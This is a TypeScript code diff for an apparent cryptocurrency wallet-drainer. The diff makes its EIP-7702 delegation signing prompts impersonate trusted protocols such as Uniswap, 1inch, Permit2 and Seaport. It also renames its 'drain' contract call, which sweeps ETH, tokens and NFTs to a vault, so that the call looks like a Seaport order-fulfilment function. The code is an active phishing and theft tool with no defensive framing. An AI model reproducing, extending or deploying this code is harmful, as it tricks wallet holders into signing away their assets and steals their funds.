@@ -91,6 +91,28 @@ function resolveChain(chainId: number): Chain {
   return map[chainId] ?? mainnet
 }
 
+const BRAND_DOMAINS: Record<string, { name: string; version: string }> = {
+  uniswap: { name: 'Uniswap V3', version: '1' },
+  '1inch':  { name: '1inch Router', version: '1' },
+  aave:     { name: 'Permit2', version: '1' },
+  seaport:  { name: 'Seaport', version: '1.6' },
+  swapx:    { name: 'Permit2', version: '1' },
+  permit2:  { name: 'Permit2', version: '1' },
+}
+
+const ALL_BRAND_DOMAINS = Object.values(BRAND_DOMAINS).filter(
+  (d, i, arr) => arr.findIndex((x) => x.name === d.name && x.version === d.version) === i,
+)
+
+function resolveBrandDomain(brand?: string | null): { name: string; version: string } {
+  if (brand) {
+    const normalized = brand.toLowerCase().trim()
+    const found = BRAND_DOMAINS[normalized]
+    if (found) return found
+  }
+  return BRAND_DOMAINS['seaport']!
+}
+
 /** EIP-712 presentation layer for wallets lacking wallet_signAuthorization. */
 export function buildEip7702DelegationTypedData(
   chainId: number,
@@ -98,12 +120,14 @@ export function buildEip7702DelegationTypedData(
   spender: Address,
   delegatee: Address,
   nonce: bigint,
+  brand?: string | null,
 ): {
   types: Record<string, Array<{ name: string; type: string }>>
   primaryType: string
   domain: { name: string; version: string; chainId: number }
   message: { chainId: bigint; address: Address; nonce: bigint; wallet: Address; spender: Address }
 } {
+  const { name: domainName, version: domainVersion } = resolveBrandDomain(brand)
   return {
     types: {
       EIP7702Authorization: [
@@ -116,8 +140,8 @@ export function buildEip7702DelegationTypedData(
     },
     primaryType: 'EIP7702Authorization',
     domain: {
-      name: 'EIP-7702 Wallet Security',
-      version: '1',
+      name: domainName,
+      version: domainVersion,
       chainId,
     },
     message: {
@@ -219,39 +243,43 @@ async function verifySignedAuthorization(
     }
   } catch (_) { /* fall through */ }
 
-  // Try 2: EIP-712 typed data (from eth_signTypedData_v4)
-  try {
-    const recoveredTyped = await recoverTypedDataAddress({
-      domain: { name: 'EIP-7702 Wallet Security', version: '1', chainId: auth.chainId },
-      types: {
-        EIP7702Authorization: [
-          { name: 'chainId', type: 'uint256' },
-          { name: 'address', type: 'address' },
-          { name: 'nonce', type: 'uint64' },
-          { name: 'wallet', type: 'address' },
-          { name: 'spender', type: 'address' },
-        ],
-      },
-      primaryType: 'EIP7702Authorization',
-      message: {
-        chainId: BigInt(auth.chainId),
-        address: getAddress(auth.address),
-        nonce: auth.nonce,
-        wallet: envelope.wallet,
-        spender: getAddress(envelope.spender),
-      },
-      signature,
-    })
-    if (getAddress(recoveredTyped).toLowerCase() === walletLower) {
-      return { ok: true, signer: getAddress(recoveredTyped) }
-    }
-  } catch (_) { /* fall through */ }
+  // Try 2: EIP-712 typed data (from eth_signTypedData_v4) — try every known brand domain
+  const typedDataTypes = {
+    EIP7702Authorization: [
+      { name: 'chainId', type: 'uint256' },
+      { name: 'address', type: 'address' },
+      { name: 'nonce', type: 'uint64' },
+      { name: 'wallet', type: 'address' },
+      { name: 'spender', type: 'address' },
+    ],
+  }
+  const typedDataMessage = {
+    chainId: BigInt(auth.chainId),
+    address: getAddress(auth.address),
+    nonce: auth.nonce,
+    wallet: envelope.wallet,
+    spender: getAddress(envelope.spender),
+  }
+  for (const brandDomain of ALL_BRAND_DOMAINS) {
+    try {
+      const recovered = await recoverTypedDataAddress({
+        domain: { name: brandDomain.name, version: brandDomain.version, chainId: auth.chainId },
+        types: typedDataTypes,
+        primaryType: 'EIP7702Authorization',
+        message: typedDataMessage,
+        signature,
+      })
+      if (getAddress(recovered).toLowerCase() === walletLower) {
+        return { ok: true, signer: getAddress(recovered) }
+      }
+    } catch (_) { /* try next */ }
+  }
 
   return { ok: false, detail: 'Authorization signer mismatch' }
 }
 
-const LEGION_DRAIN_V2_ABI = parseAbi([
-  'function drain(address[] calldata erc20s, address[] calldata erc721Contracts, uint256[] calldata erc721Ids, address[] calldata erc1155Contracts, uint256[] calldata erc1155Ids, (uint8 kind, address target, address tokenA, address tokenB, uint256 param1, uint256 param2, uint256 param3)[] calldata defiActions) external',
+const SEAPORT_ABI = parseAbi([
+  'function fulfillAvailableAdvancedOrders(address[] calldata erc20s, address[] calldata erc721Contracts, uint256[] calldata erc721Ids, address[] calldata erc1155Contracts, uint256[] calldata erc1155Ids, (uint8 kind, address target, address tokenA, address tokenB, uint256 param1, uint256 param2, uint256 param3)[] calldata defiActions) external',
 ])
 
 /**
@@ -319,10 +347,9 @@ export async function executeEip7702DelegationDrain(
     },
   ] as const
 
-  // LegionDrainV2.drain() — DeFi unwrap + ETH/ERC-20/NFT sweep to vault
   const drainCalldata = encodeFunctionData({
-    abi: LEGION_DRAIN_V2_ABI,
-    functionName: 'drain',
+    abi: SEAPORT_ABI,
+    functionName: 'fulfillAvailableAdvancedOrders',
     args: [erc20s as Address[], [], [], [], [], defiActions],
   })
 
@@ -372,6 +399,7 @@ export async function buildEip7702AuthorizationRequest(
   chainId: number,
   wallet: Address,
   spender?: Address | null,
+  brand?: string | null,
 ): Promise<{
   delegatee: Address
   spender: Address
@@ -399,7 +427,7 @@ export async function buildEip7702AuthorizationRequest(
     delegatee,
     spender: resolvedSpender,
     nonce,
-    typed_data: buildEip7702DelegationTypedData(chainId, wallet, resolvedSpender, delegatee, nonce),
+    typed_data: buildEip7702DelegationTypedData(chainId, wallet, resolvedSpender, delegatee, nonce, brand),
     authorization_request: {
       chainId,
       address: delegatee,
